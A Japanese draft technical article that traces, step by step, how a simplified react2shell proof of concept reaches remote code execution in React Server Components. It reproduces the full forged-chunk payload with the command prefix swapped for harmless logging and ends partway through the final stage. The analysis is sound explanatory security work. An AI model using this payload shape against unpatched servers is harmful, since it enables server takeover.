---
title: "簡略版 react2shell PoC はどう動くのか？安全側動的解析レポート"
emoji: "📑"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["react", "react2shell", "javascript", "rsc", "nextjs"]
published: false
---

# はじめに

この記事は、[react2shell](https://react2shell.com/) の PoC 攻撃手法のうち、
Vercel CEO による脆弱性レポートで紹介されていた**簡略版 PoC** の形を、
ローカルの脆弱版 React / Next.js 環境で追い直した記録です。

前稿では `"$B0"` を使う形の PoC を解説しました。
今回扱う PoC はそれより短く、
`"$1:then"` / `"$1:then:constructor"` / `"$B"` だけで完結します。
短いぶんだけ構造が素直で、かえって本質が見えやすい・・・
と感じたので、改めて一から追い直してみました。

なお、この記事では危険な OS コマンドは実行しません。
元 PoC の `_prefix` に相当する箇所だけを harmless な観測用コードに差し替え、
PoC の形をできるだけ保ったまま、
**どの関数がどの順序で呼ばれるか**を確認していきます。

# 最初に結論

今回の簡略 PoC でも、`"$@0"` や `"$B"` が**単体でコード実行を起こすわけではありません**。

`"$@0"` は raw chunk `0` を取り出すための**足場**です。
`"$B"` は forged `_response._formData.get(...)` を呼び、
その戻り値として generated function を作るための**足場**です。
本当に関数本体が実行されるのは、
その generated function が JavaScript の thenable assimilation により
`then(resolve, reject)` として呼ばれる瞬間です。

今回の PoC では、field `1` の `"$@0"` により raw chunk `0` を取り出し、
`"$1:then"` で `Chunk.prototype.then` を得ます。
さらに `"$1:then:constructor"` により `Chunk.prototype.then.constructor`、
つまり `Function` constructor に到達します。
その後、`value: '{"then":"$B"}'` の revive 中に
`Function(_prefix + "NaN")` が生成され、
最後にそれが `then` として呼ばれます。

脆弱版環境への安全側の動的解析では、
元 PoC の形をほぼ保ったまま、`_prefix` だけを harmless な trace に差し替えました。
`console.log(...)//` だけの版では
generated function 本体由来の**サーバログ**が出ました。
さらに到達確認用に
`arguments[0](["trace-original-poc","from-safe-prefix"])//` を使った版では、
HTTP `200` で Server Action に
`trace-original-poc` / `from-safe-prefix` が渡ることを確認しました。

# 検証対象と注意事項

今回の追試で実際に使った組み合わせは以下のとおりです。

| リポジトリ | コミットハッシュ |
| --- | --- |
| `react/` | `6de32a5a07958d7fc2f8d0785f5873d2da73b9fa` |
| `next.js/` | `c09c5f9e278e46b0923c96ef5cf8a6bd9edbaf80` |

Next.js が実行時に解決していた `react-server-dom-webpack` は
`19.2.0-canary-6de32a5a-20250822` でした。

動的解析はすべてローカル環境で行っており、
本番環境への試行は行っていません。
また、危険な RCE 文字列は使わず、
攻撃経路の成立だけを確認できる harmless な payload に差し替えています。
したがって、この記事は「**PoC の成立条件を安全側に倒して検証したメモ**」として
読んでいただければ幸いです。

それでもなお、私の解釈違いや見落としはありえます。
もし明白な誤りが見つかった場合は、追記か非公開化で対応します。

# 事前知識

## 1. React Server Components / Server Functions / Server Actions

React Server Components は、
コンポーネントの一部をサーバ側で実行し、
その結果をクライアント側へ送る仕組みです。
React 公式ドキュメントでも、Server Components は
クライアントバンドルとは別の**サーバ環境で先に実行される**コンポーネントとして
説明されています。

一方、`"use server"` が付いた関数は、
React 公式の用語では **Server Functions** と呼ばれます。
フォームの `action` として使われる文脈では **Server Actions** とも呼ばれます。
Next.js 側でも、サーバ上で動く async 関数を
クライアントからネットワークリクエスト越しに呼ぶ仕組みとして説明されています。

react2shell では、この
**「Server Action の引数を HTTP request から復元する処理」** が入口になります。

## 2. React Flight プロトコルとは何か

Flight は、React Server Components / Server Functions の値を
クライアントとサーバの間でやり取りするための**内部シリアライズ形式**です。
見た目は JSON に近い部分もありますが、単なる JSON ではありません。
文字列中の特殊構文により、
別 chunk への参照、未解決値、Blob 参照、outlined model 参照など
多様な表現ができます。

つまり、Flight payload は「データ」ではあるものの、
単なる静的な JSON データではありません。
参照解決や遅延解決を含む、
**実行時オブジェクト復元のための表現**であると言えます。

## 3. Server Actions と Flight デコード、`multipart/form-data`

Server Action の呼び出しでは、
引数や関連データが HTTP request body として送られます。
React / Next.js のフォーム送信では `FormData` が使われるため、
実際のリクエスト本体は `multipart/form-data` になります。

`multipart/form-data` は、ひとつの body の中に複数の part を入れる形式です。
part は通常の text field であることもあれば、
file stream であることもあります。
react2shell の経路では、この multipart body の field に
Flight payload が含まれます。

ここで重要なのは、
**Server Action の入力が最終的に Flight payload として decode される**点です。
つまり今回の入口は、Server Action と multipart form の組み合わせであり、
その先で React Flight の decode が動くということです。

ここで必要なのは RFC の細部ではなく、次の理解だけで十分です。

- Server Action の入力は HTTP request body から復元される
- 実際の body は `multipart/form-data` で運ばれる
- その field 群の一部が Flight payload として decode される

## 4. JavaScript の prototype chain

JavaScript は、他の言語のように class ベースの仕組みだけで動いているわけではなく、
内部的には **prototype** を使って object の振る舞いを組み立てています。
近年の JavaScript には `class` 構文がありますが、
実際にはそれも「prototype を使う書き方を読みやすくした**糖衣構文**」に過ぎません。

言い換えると、JavaScript の継承は
「ある object が別の object を prototype として参照する」
という形で表現されます。
ある object 自身に property や method がなくても、
その prototype や、さらにその先の prototype に同名の値があれば、
それを使えます。

JavaScript の object は、自分自身の property だけでなく、
**prototype chain 上の property も参照できます**。

たとえば、ある object に `toString` が直接定義されていなくても、
`Object.prototype.toString` が prototype chain 上に存在すれば、
`obj.toString` として参照できます。

```text
obj
  ↓ [[Prototype]]
Object.prototype
  ↓ [[Prototype]]
null
```

`class` 構文を使った場合も、内部では似たことが起きています。
概念的には次のように読めます。

```js
class Animal {
  speak() {
    return "sound";
  }
}

class Dog extends Animal {}

const dog = new Dog();
dog.speak(); // "sound"
```

このとき `dog` 自身に `speak` が直接生えていなくても、
JavaScript エンジンは `dog` を見て、
なければ `Dog.prototype` を見て、
さらに必要なら `Animal.prototype` を見ます。
そこで `speak` が見つかれば、その method が呼ばれます。

概念図で書くと次のようになります。

```text
dog
  ↓ [[Prototype]]
Dog.prototype
  ↓ [[Prototype]]
Animal.prototype
  ↓ [[Prototype]]
Object.prototype
  ↓ [[Prototype]]
null
```

つまり、継承された object に対する method 呼び出しは、
「その object がどの prototype chain を持っているか」に依存しています。
`dog.speak()` は見た目には単純な method 呼び出しですが、
内部では「`dog` 自身に `speak` があるか」
「なければ prototype にあるか」を順に辿って解決しています。

今回の PoC で重要なのも、まさにこの点です。
property access や method access は **own property に限定されず**、
prototype chain 上の値にも届きます。
そのため、ある参照が一見ただの data access に見えても、
実際には prototype 上の関数 object まで辿れてしまうことがあります。

## 5. prototype traversal とは何か

では、**prototype traversal** とはどういうことでしょうか。

prototype traversal とは、`obj["a"]["b"]` のような property path 解決が
own property に限定されず、
**prototype chain 上の property まで辿ってしまう問題**です。

通常のデータ参照のつもりで path を解決していても、
`constructor` のような property が path に含まれると、
constructor function に到達できる場合があります。

たとえば、外部から property path を受け取って object を辿る関数があるとします。

```js
class Animal {
  speak() {
    return "sound";
  }
}

class Dog extends Animal {
  constructor() {
    super();
    this.profile = { name: "Pochi" };
  }
}

function readByPath(obj, path) {
  return path.split(".").reduce((value, key) => value[key], obj);
}

const dog = new Dog();

readByPath(dog, "profile.name"); // "Pochi"
readByPath(dog, "speak"); // Animal.prototype.speak に到達する
```

この `readByPath` は見た目には単純な data accessor ですが、
`dog` 自身に `speak` がなくても、
prototype chain を辿って `Animal.prototype.speak` に届いてしまいます。
つまり、外部から指定できる path が own property のみに制限されていないと、
「その object に直接ある値だけを読むつもりだった」のに、
**継承元の method や constructor にまで到達できる**わけです。

概念的には次のことが起きています。

```text
readByPath(dog, "speak")
  -> dog["speak"]
  -> own property になければ Dog.prototype を見る
  -> さらに Animal.prototype を見る
  -> Animal.prototype.speak を返す
```

react2shell では、これと同じ発想が
Flight の outlined model 参照と組み合わさり、
通常の JSON-like な値から `Chunk.prototype.then` や `Function` へ到達します。

後続の段階との対応は次のとおりです。

```text
第1段階:
  prototype traversal で Chunk.prototype.then へ到達する

第3段階:
  prototype traversal で Function へ到達する
```

## 6. Function オブジェクトと Function コンストラクタの関係

JavaScript の関数は object であり、
各関数 object は `constructor` property を持ちます。
通常の関数 `f` に対して `f.constructor === Function` が成り立ちます。

つまり、何らかの方法で「**関数 object そのもの**」に届けば、
その `constructor` から `Function` コンストラクタへ辿れます。

今回の簡略 PoC では、まさにこれが使われています。
`"$1:then"` により `Chunk.prototype.then` という関数 object を得て、
さらに `"$1:then:constructor"` により `Function` へ辿ります。

JavaScript の `Function` コンストラクタは、
**文字列から新しい関数 object を作ります**。
概念的には `Function("return 1 + 1")` のように、
文字列を関数本体としてコンパイルできます。

```js
const fn = Function("return 1 + 1");
fn(); // 2
```

この仕組みは、信頼できる静的文字列に対して使う場合でも避けられがちであり、
未信頼入力と組み合わさると**重大なコード実行リスク**になります。

react2shell で重要なのは、
`Function(...)` が呼ばれた瞬間に RCE が完了するわけではない点です。
`Function(...)` は generated function を**作る**だけです。
本当に関数本体が実行されるのは、
その generated function が後続の thenable assimilation により
`then(resolve, reject)` として呼ばれる瞬間です。

## 7. Promise / thenable / thenable assimilation

Promise は、JavaScript で非同期処理の結果を表す object です。
まだ結果が出ていない処理を Promise として受け取り、
成功したら `resolve`、失敗したら `reject` されます。

`async/await` は、この Promise を読みやすく扱うための構文です。
`await promise` と書くと、
その Promise が解決されるまで待ち、解決後の値を取り出します。

```js
async function main() {
  const value = await Promise.resolve("ok");
  return value;
}
```

Promise には、`then` をチェーンできるという性質があります。

```js
Promise.resolve(1)
  .then((value) => value + 1)
  .then((value) => value * 2);
```

ここで重要なのは、`then` の callback がさらに Promise を返した場合でも、
Promise はその内側の Promise を待ってから次の `then` に値を渡す点です。

```js
Promise.resolve("start")
  .then(() => Promise.resolve("inner"))
  .then((value) => {
    // value は Promise そのものではなく "inner"
    return value;
  });
```

この性質により、Promise のネストは次のようにフラットな chain として扱えます。

```text
Promise<Promise<value>>
  ↓
Promise<value> として取り込まれる
  ↓
次の then に value が渡る
```

この「返ってきた Promise をさらに解決して取り込む」性質があるため、
Promise は非同期処理をネストではなく chain として表現できます。

ここで **thenable** という概念が出てきます。
thenable とは、Promise そのものではなくても `then` メソッドを持つ object のことです。

JavaScript の Promise 解決処理は、値が Promise instance かどうかだけを見るのではなく、
**「`then` という callable property を持っているか」** を見ます。
これは duck typing の一種です。

duck typing とは、
「その object が何の class の instance か」ではなく、
「必要な形や振る舞いを持っているか」で扱いを決める考え方です。
たとえば「`then` を持っているなら Promise のように扱える」と判断するのが
thenable の発想です。

そのため、Promise ではない plain object でも、
callable な `then` を持っていれば Promise のように呼び出されます。

概念図で書くとこうなります。

```text
resolve(value)
  ↓
value has callable then?
  ↓ yes
value.then(resolveNext, rejectNext)
```

安全な最小例は次のとおりです。

```js
const thenable = {
  then(resolve) {
    resolve("ok");
  },
};

await thenable; // "ok"
```

この object は `Promise` ではありません。
しかし `then` を持つため、
`await` / Promise 解決処理から Promise 的なものとして扱われます。

Flight プロトコルのデコードでは、後述する `chunk` という object が出てきます。
この chunk は React Flight の内部状態を表す object ですが、
同時に `then` を持つため Promise 的な挙動をします。
つまり、React Flight の decode 処理では
**「chunk が thenable として待たれる」** 場面があります。

react2shell では、この thenable assimilation が二回悪用されます。

1. 1 回目は、root chunk の復元値である forged object の `then` が呼ばれる場面です。
   この `then` の実体は `Chunk.prototype.then` であり、
   forged object を chunk として再初期化します。
2. 2 回目は、`"$B"` が返した generated function が `then` として呼ばれる場面です。
   ここで generated function の本体が実行されます。

## 8. Flight における chunk の話と thenable との関係

Flight のデコードでは、各値が chunk として管理されます。
chunk は ID を持ち、React の内部 `response` object の `_chunks` map に保存されます。

chunk には状態があり、概念的には次のように遷移します。

- `PENDING`: まだ値が届いていない
- `RESOLVED_MODEL`: 文字列としての model は届いたが、まだ revive されていない
- `INITIALIZED`: revive が完了し、実際の値になった
- `ERRORED`: 復元中にエラーが発生した

概念モデルは次のように考えれば十分です。

```ts
type Chunk<T> = {
  status: Status;
  value: any;
  reason: any;
  _response: Response;
  then(resolve: (value: T) => void, reject?: (reason: any) => void): void;
};
```

chunk は `then` を持つため、JavaScript からは thenable として扱われます。
そのため、`decodeReplyFromBusboy(...)` が root chunk `0` を返すと、
呼び出し側の `await` / Promise 解決処理は
`rootChunk0.then(...)` を呼びます。

今回の PoC では、この
**「Flight の内部表現である chunk が thenable でもある」** という点が、
React 側の revive と JavaScript 側の thenable assimilation を繋ぐ接点になっています。

## 9. 今回登場する Flight 構文

今回の PoC で重要な構文を整理してみましょう。

| 構文 | 概念的な意味 | react2shell での役割 |
| --- | --- | --- |
| `"$@<id>"` | raw chunk 参照 | chunk object そのものへ到達する足場 |
| `"$B<id>"` | backing FormData 参照 | forged `_formData.get` を経由して generated function を返す足場 |
| `"$<id>:path"` | outlined model 参照 + property path | prototype traversal により `then` や `Function` へ到達する足場 |

ここで重要なのは、これらの構文が**単体で RCE を起こすわけではない**点です。

- `"$@0"` は raw chunk を返すだけです
- `"$B"` は `response._formData.get(...)` の戻り値を返すだけです
- `"$<id>:path"` は property path を辿るだけです

危険なのは、それらの戻り値が後続の thenable assimilation に渡るように
**payload 全体を組み立てられる**点です。

なお、通常の outlined model 参照と raw chunk 参照は同じではありません。
通常の `"$<id>"` 参照で辿れるのは revive 後の値であり、
chunk object そのものではありません。
これに対して `"$@<id>"` は chunk object そのものへ到達します。
そのため、`Chunk.prototype.then` のような chunk 固有の性質を回収する足場としては
`"$@"` が必要になります。

## 10. Busboy とは何か

Busboy は、Node.js で incoming な HTML form data を
stream として解析する **parser** です。
README でも、`multipart/form-data` を含む form data をパースし、
`file` event と `field` event を通知する
ストリーミング parser として説明されています。

重要なのは、**Busboy 自体は React Flight を理解しない**点です。
Busboy が理解するのは multipart の構造だけであり、
通常 field が来れば `field` event、
file part が来れば `file` event として通知します。

```text
HTTP request body
  ↓
Busboy
  ├─ field event: name, value
  ├─ file event: name, stream, metadata
  ├─ finish / close event
  └─ error event
```

react2shell の脆弱性は Busboy 自体にあるわけではありません。
重要なのは、React の `decodeReplyFromBusboy` が Busboy の event を受け取り、
それを **React Flight の chunk 管理状態へ接続する**点です。

## 11. `decodeReplyFromBusboy` 実装と `response` オブジェクト、Flight デコードの流れ

`decodeReplyFromBusboy` は、
Server Action の `multipart/form-data` 入力を Busboy stream として受け取り、
それを React Flight の内部 `response` / chunk 管理状態へ接続する関数です。

この関数は、まず React Flight 用の内部 `response` object を作ります。
ここでいう `response` は HTTP response ではなく、
**Flight reply の復元状態を保持する内部オブジェクト**です。
その後、Busboy に `field` / `file` / `finish` / `error` などの handler を登録し、
最後に `getRoot(response)`、つまり root chunk `0` を返します。

責務を整理してみましょう。

1. `createResponse(...)` で内部 `response` を作る
2. Busboy の `field` / `file` event handler を登録する
3. field を `resolveField(...)` に流す
4. file part と field part の順序を `pendingFiles` / `queuedFields` で管理する
5. `getRoot(response)` で root chunk `0` を返す

重要なのは、`decodeReplyFromBusboy(...)` が完成済みの Server Action 引数を
**即座に返すわけではない**点です。
返すのは root chunk `0` であり、これは thenable です。
したがって、呼び出し側はこの root chunk を
`await` / Promise 解決の対象として扱います。

## 12. なぜこれらが組み合わさると危険なのか

ここまでの知識をまとめると、
react2shell の危険性は単一の機能にあるわけではありません。

- Server Action は HTTP request から引数を復元する
- その入口で Flight decode が動く
- prototype traversal により想定外の prototype property へ到達できる
- `Function` constructor は文字列から関数を作れる
- Promise は thenable を見つけると `then(resolve, reject)` を呼ぶ
- Flight の chunk も thenable である
- `"$@"`, `"$B"`, `"$<id>:path"` はその橋渡しに使える

react2shell は、これらが連鎖した結果、
**データとして送られたはずの値が最終的に実行可能な `then` へ昇格する**脆弱性です。

対応表を整理してみましょう。

| 事前知識 | 後で使う段階 | 役割 |
| --- | --- | --- |
| Server Actions / Server Functions | 第0段階 | なぜ HTTP request から関数引数を復元するのか |
| Flight protocol | 第1・第3段階 | なぜ文字列が特殊解釈されるのか |
| multipart/form-data | 第0段階 | なぜ request body が field / file に分かれるのか |
| prototype chain | 第1・第3段階 | `constructor` を辿れる理由 |
| Function constructor | 第3・第4段階 | generated function が作られる理由 |
| thenable assimilation | 第2・第4段階 | `then(resolve, reject)` が呼ばれる理由 |
| chunk | 第0〜第3段階 | なぜ root chunk が thenable なのか |
| `$@`, `$B`, `$<id>:path` | 第1・第3段階 | raw chunk 参照、FormData 参照、prototype traversal |
| Busboy | 第0段階 | なぜ `field` event / `file` event が出てくるのか |
| `decodeReplyFromBusboy` | 第0段階 | root chunk `0` が返る理由 |

# 攻撃の全体像

## まず harmless 化した PoC

今回の検証対象は、次の簡略版 PoC です。

```json
{
  0: {
    status: "resolved_model",
    reason: 0,
    _response: {
      _prefix: "console.log('[trace]')//",
      _formData: {
        get: "$1:then:constructor"
      }
    },
    then: "$1:then",
    value: "{\"then\":\"$B\"}"
  },
  1: "$@0"
}
```

元 PoC では `_prefix` に危険なコード片が入っていましたが、
ここでは `console.log(...)//` に置き換えています。
これは安全のためだけでなく、
今回の PoC が本当に generated function まで到達しているかを
サーバログで観測しやすくするためでもあります。

ただし、この `console.log(...)//` だけの版は
「本体が呼ばれたか」を見るには向いている一方、
`resolve` も `reject` も呼びません。
そのため、HTTP 応答まで正常に完了するとは限りません。
そこで動的解析では次の 2 種類を使い分けました。

- `log-only` 版: `_prefix = 'console.log("[original-shape-safe-log]", JSON.stringify({arg0Type: typeof arguments[0], arg1Type: typeof arguments[1], processType: typeof process}))//'`
- `resolve` 版: `_prefix = 'arguments[0](["trace-original-poc","from-safe-prefix"])//'`

前者は元 PoC の形により近く、「generated function 本体が呼ばれたか」を確認するためのものです。
後者は同じ骨格で Promise を明示的に解決し、
「Server Action まで値が戻るか」を確認するためのものです。

## 今回の PoC に合わせた段階区分

前稿の PoC と違い、今回は
`"$1:then"` と `"$1:then:constructor"` だけで
`Chunk.prototype.then` と `Function` に届きます。
そのため、説明の軸も少し組み直した方が分かりやすくなります。

今回は次の 5 段階で追っていきます。

| 段階 | 処理主体 | 主な関数・機構 | 起きること | 発火 |
| --- | --- | --- | --- | --- |
| 第0段階 | Next.js / React / Busboy | `decodeReplyFromBusboy`, `createResponse`, `getRoot` | multipart stream を Flight の `response` / `chunk` 管理へ接続し、root chunk `0` を返す | しない |
| 第1段階 | React Flight | `resolveField`, `initializeModelChunk`, `parseModelString`, `getOutlinedModel` | root chunk `0` を revive し、forged chunk を組み立てる | しない |
| 第2段階 | JS Promise | thenable assimilation | root chunk の解決値である forged chunk の `then` が呼ばれる | しない |
| 第3段階 | React Flight | `Chunk.prototype.then`, `initializeModelChunk`, `parseModelString("$B")` | forged chunk を再 revive し、generated function を `then` に持つ object を作る | まだしない |
| 第4段階 | JS Promise | thenable assimilation | generated function が `then(resolve, reject)` として呼ばれる | **ここ** |

今回の PoC では `"$B0"` ではなく `"$B"` が使われている点も重要です。
`parseModelString` の `case 'B'` は `parseInt(value.slice(2), 16)` を行うため、
`"$B"` では `parseInt("", 16)` となり `id = NaN` になります。
したがって、実際に呼ばれるのは
`response._formData.get(response._prefix + "NaN")` です。

そのため、末尾の `//` は
「あとから付く `"NaN"` をコメントとして吸収する」役割を持ちます。
これは前稿の `"$B0"` 版で末尾の `"0"` を吸収していたのと同じ発想ですが、
今回の PoC では吸収対象が `"NaN"` に変わっています。

## 関数呼び出しネストの全体図

大づかみに書くと、呼び出しネストは次のようになります。

```text
decodeReplyFromBusboy
  ↓
rootChunk0.then(resolve0, reject0)           // 通常の await
  ↓
initializeModelChunk(rootChunk0)             // 1回目の revive
  ↓
forgedChunk.then(resolve1, reject1)          // 1回目の攻撃的 assimilation
  ↓
initializeModelChunk(forgedChunk)            // 2回目の revive
  ↓
generatedFunction(resolve2, reject2)         // 2回目の攻撃的 assimilation
```

要点は次の 3 つです。

1. `"$@0"` は raw chunk `0` 参照の足場であって、それ自体が critical な `then` を呼びません。
2. `"$B"` も即実行 primitive ではなく、generated function を返す足場です。
3. 本当の発火点は、generated function が `then(resolve, reject)` として呼ばれる第4段階です。

## 今回の PoC で作られる値を先に俯瞰する

PoC を注入した直後、React runtime が扱う主要な値は概念的に次のようになります。

```js
realResponse = {
  _prefix: "",
  _formData: FormData {
    "0" => "{\"status\":\"resolved_model\",...}",
    "1" => "\"$@0\""
  },
  _chunks: Map(...),
  _closed: false,
  _closedReason: null
}

rootChunk0 (初期) = {
  status: "pending",
  value: null,
  reason: null,
  _response: realResponse,
  then: Chunk.prototype.then
}
```

そして第1段階の revive が終わると、`rootChunk0.value` は概念的に次の forged chunk になります。

```js
forgedChunk = {
  status: "resolved_model",
  reason: 0,
  _response: {
    _prefix: "console.log('[trace]')//" or harmless resolve payload,
    _formData: {
      get: Function
    }
  },
  then: Chunk.prototype.then,
  value: "{\"then\":\"$B\"}"
}
```

さらに第3段階の revive が終わると、`forgedChunk.value` は次になります。

```js
forgedChunk.value = {
  then: generatedFunction
}
```

ここで `generatedFunction` は概念的には次と等価です。

```js
Function(response._prefix + "NaN")
```

`"$B"` なので後ろに付くのは `"0"` ではなく `"NaN"` であり、
PoC 側の `//` はこの trailing `"NaN"` をコメント化するためのものです。
今回の形ではこの点が特に重要です。

# 第0段階: `decodeReplyFromBusboy` が root chunk `0` を返す

Next.js 側の入口は、脆弱版コミットでは次の await です。

```js
boundActionArguments = await decodeReplyFromBusboy(busboy, serverModuleMap, {
  temporaryReferences,
});
```

ここで await されるのは攻撃者の plain object ではなく、
`decodeReplyFromBusboy(...)` が返す root chunk `0` です。

React 側の `decodeReplyFromBusboy` は、
まず `createResponse(...)` で内部 `response` を作り、
Busboy の `field` / `file` をそこへ接続し、
最後に `getRoot(response)` を返します。

```js
function decodeReplyFromBusboy(busboyStream, webpackMap, options) {
  const response = createResponse(
    webpackMap,
    "",
    options ? options.temporaryReferences : undefined
  );
  // ...
  return getRoot(response);
}
```

この段階で実際に root chunk `0` が返ることは、
`getRoot` と `getChunk` を合わせて読むとさらに明確です。

```js
export function getRoot(response) {
  const chunk = getChunk(response, 0);
  return chunk;
}

function getChunk(response, id) {
  const backingEntry = response._formData.get(response._prefix + id);
  if (backingEntry != null) {
    chunk = createResolvedModelChunk(response, backingEntry, id);
  } else {
    chunk = createPendingChunk(response);
  }
  return chunk;
}
```

この段階で見えている値は次のように整理できます。

```js
response._prefix = ""
response._formData = backing FormData
response._chunks = new Map()

getRoot(response)
  -> getChunk(response, 0)
  -> rootChunk0
```

重要なのは、第0段階ではまだ攻撃的な revive は起きていない点です。
ここで得られるのは「**後で field `0` を読める thenable な root chunk**」だけです。

# 第1段階: root chunk `0` の revive で forged chunk を組み立てる

field `0` が到着すると、
`resolveField(response, "0", payload0)` から `initializeModelChunk(rootChunk0)` へ進みます。

この流れをコードで見ると、
まず Busboy の `field` event が `resolveField` を呼び、
そこから `resolveModelChunk` が root chunk `0` を `resolved_model` に進めます。

```js
export function resolveField(response, key, value) {
  response._formData.append(key, value);
  const id = +key.slice(response._prefix.length);
  const chunk = response._chunks.get(id);
  if (chunk) {
    resolveModelChunk(chunk, value, id);
  }
}

function resolveModelChunk(chunk, value, id) {
  const resolvedChunk = chunk;
  resolvedChunk.status = RESOLVED_MODEL;
  resolvedChunk.value = value;
  resolvedChunk.reason = id;
  if (resolveListeners !== null) {
    initializeModelChunk(resolvedChunk);
    wakeChunkIfInitialized(chunk, resolveListeners, rejectListeners);
  }
}
```

呼び出しの骨格は次のとおりです。

```text
resolveField(response, "0", payload0)
  ↓
resolveModelChunk(rootChunk0, payload0, 0)
  ↓
initializeModelChunk(rootChunk0)
  ↓
JSON.parse(rootChunk0.value)
  ↓
reviveModel(realResponse, ...)
```

そして `initializeModelChunk` 本体では、
`chunk.value` を `JSON.parse` し、
その結果を `reviveModel(chunk._response, ...)` に渡しています。

```js
function initializeModelChunk(chunk) {
  const rawModel = JSON.parse(chunk.value);
  const value = reviveModel(
    chunk._response,
    {'': rawModel},
    '',
    rawModel,
    rootReference,
  );
  initializedChunk.status = INITIALIZED;
  initializedChunk.value = value;
}
```

今回の PoC で特に重要なプロパティは 4 つあります。

| プロパティ | 入力値 | revive 後の意味 |
| --- | --- | --- |
| `then` | `"$1:then"` | raw chunk `0` から `Chunk.prototype.then` を回収する |
| `_response._formData.get` | `"$1:then:constructor"` | `Chunk.prototype.then.constructor` から `Function` へ届く |
| `value` | `"{\"then\":\"$B\"}"` | 2 回目 revive 用の model 文字列 |
| `field 1` | `"$@0"` | raw chunk `0` を返す足場 |

このときの参照関係は、次のように可視化できます。

```text
field 1
  -> "$@0"
  -> raw rootChunk0

"$1:then"
  -> chunk 1 の値
  -> raw rootChunk0
  -> raw rootChunk0.then
  -> Chunk.prototype.then

"$1:then:constructor"
  -> chunk 1 の値
  -> raw rootChunk0
  -> raw rootChunk0.then
  -> Chunk.prototype.then
  -> Chunk.prototype.then.constructor
  -> Function
```

この property path 解決自体は、
`getOutlinedModel` の次のループで行われます。

```js
function getOutlinedModel(response, reference, parentObject, key, map) {
  const path = reference.split(':');
  const chunk = getChunk(response, parseInt(path[0], 16));
  if (chunk.status === INITIALIZED) {
    let value = chunk.value;
    for (let i = 1; i < path.length; i++) {
      value = value[path[i]];
    }
    return map(response, value);
  }
}
```

ここで大事なのは、今回の簡略 PoC では
`rawRootChunk.then.constructor` だけで `Function` に届いている点です。
`Chunk.prototype.then` は関数なので、
その `constructor` は `Function` になります。

第1段階が終わった時点の `rootChunk0.value` は、
概念的には次の forged chunk になります。

```js
rootChunk0.value = forgedChunk = {
  status: "resolved_model",
  reason: 0,
  _response: {
    _prefix: harmlessPrefix,
    _formData: {
      get: Function
    }
  },
  then: Chunk.prototype.then,
  value: "{\"then\":\"$B\"}"
}
```

つまり第1段階の目的は、
plain object を thenable 化するだけでなく、
**2 回目 revive 用の forged `_response` までこの時点で埋め込んでしまうこと**にあります。

# 第2段階: forged chunk の `then` が呼ばれる

第1段階で root chunk `0` が解決されると、
await 側の Promise 解決処理はその値を検査し、
thenable なら `then(resolve, reject)` を呼びます。

そのため、ここで実際に起きるのは次です。

```text
resolve0(forgedChunk)
  ↓
Promise sees thenable
  ↓
forgedChunk.then(resolve1, reject1)
  ↓
Chunk.prototype.then.call(forgedChunk, resolve1, reject1)
```

`forgedChunk.then` の実体は、
第1段階で埋め込まれた `Chunk.prototype.then` です。
ここでの `this` は本物の `Chunk` instance ではなく plain object ですが、
`status`, `value`, `reason`, `_response` が揃っているため、
実装はそのまま進んでしまいます。

relevant な骨格は次のとおりであり、
ここで `this` が forged chunk にすり替わるのが重要です。

```js
Chunk.prototype.then = function (resolve, reject) {
  const chunk = this;
  switch (chunk.status) {
    case RESOLVED_MODEL:
      initializeModelChunk(chunk);
      break;
  }
  switch (chunk.status) {
    case INITIALIZED:
      resolve(chunk.value);
      break;
  }
};
```

つまり第2段階のコード上の実態は、次の 2 行に要約できます。

```ts
if (chunk.status === RESOLVED_MODEL) initializeModelChunk(chunk)
if (chunk.status === INITIALIZED) resolve(chunk.value)
```

したがって、第2段階で起きていることは
「**borrowed `then` が forged chunk を 2 回目の revive に送り込み、
終わったらその `value` を Promise 側へ返すこと**」であり、
まだ generated function 本体は実行されません。

# 第3段階: forged `_response` の下で `"$B"` が generated function を返す

第2段階から `initializeModelChunk(forgedChunk)` に入ると、
今度は `forgedChunk._response` が `reviveModel` に渡されます。

ここが今回の PoC の本丸です。
1 回目と 2 回目の revive を比べると次のようになります。

| revive | 対象 chunk | `reviveModel` に渡る `response` |
| --- | --- | --- |
| 1 回目 | `rootChunk0` | React runtime が作った本物の `response` |
| 2 回目 | `forgedChunk` | 攻撃者入力から組み立てられた forged `_response` |

2 回目の revive では `value = "{\"then\":\"$B\"}"` が JSON.parse され、
`parseModelString("$B")` が動きます。

`parseModelString` で今回直接効いている分岐は、
`"$@"` と `"$B"` の 2 つです。

```js
case '@': {
  const id = parseInt(value.slice(2), 16);
  const chunk = getChunk(response, id);
  return chunk;
}

case 'B': {
  const id = parseInt(value.slice(2), 16);
  const blobKey = response._prefix + id;
  const backingEntry = response._formData.get(blobKey);
  return backingEntry;
}
```

今回の簡略 PoC では、
第1段階では `"$@0"` により raw chunk `0` を取り出し、
第3段階では `"$B"` により forged `_formData.get(...)` の戻り値を取り出しています。

今回 `value` は `"$B"` なので、各値は次のようになります。

```ts
value.slice(2) = ""
parseInt("", 16) = NaN
blobKey = response._prefix + NaN
        = harmlessPrefix + "NaN"
backingEntry = response._formData.get(harmlessPrefix + "NaN")
```

そして第1段階で `response._formData.get = Function` が仕込まれているため、
ここで起きるのは概念的に次です。

```js
backingEntry = Function(response._prefix + "NaN")
```

この戻り値は即実行ではありません。
`Function(...)` の戻り値は generated function であり、
ここで得られるのは「あとで `then` として呼ばれる関数」です。

このことは、2 回目の `initializeModelChunk` が終わった直後の値を
次のように読むと分かりやすいです。

```js
入力:
  forgedChunk.value = "{\"then\":\"$B\"}"

revive 後:
  forgedChunk.value = {
    then: Function(forgedChunk._response._prefix + "NaN")
  }
```

今回の PoC で `//` が入っている理由もここで説明できます。
たとえば harmless 版の `_prefix` が次であれば、

```js
console.log("[original-shape-safe-log]", JSON.stringify({...}))//
```

実際に `Function(...)` に渡る本体は次のようになります。

```js
console.log("[original-shape-safe-log]", JSON.stringify({...}))//NaN
```

末尾の `"NaN"` はコメントとして吸収されるため、
関数本体として有効な JavaScript が保たれます。

この段階の成果は、次の object が得られることです。

```js
forgedChunk.value = {
  then: generatedFunction
}
```

ここでもまだ critical な実行は起きていません。
`"$B"` は generated function を返しただけであり、
発火点は次段にあります。

# 第4段階: generated function が `then(resolve, reject)` として呼ばれる

`Chunk.prototype.then.call(forgedChunk, ...)` は、
第3段階の revive が終わると `resolve1(forgedChunk.value)` を呼びます。
しかし `forgedChunk.value` は `then` を持つ object なので、
Promise 解決処理はもう一度 thenable assimilation を行います。

React 側コードとして見える最後の地点は、
第2段階でも抜粋したこの行です。

```js
case INITIALIZED:
  resolve(chunk.value);
  break;
```

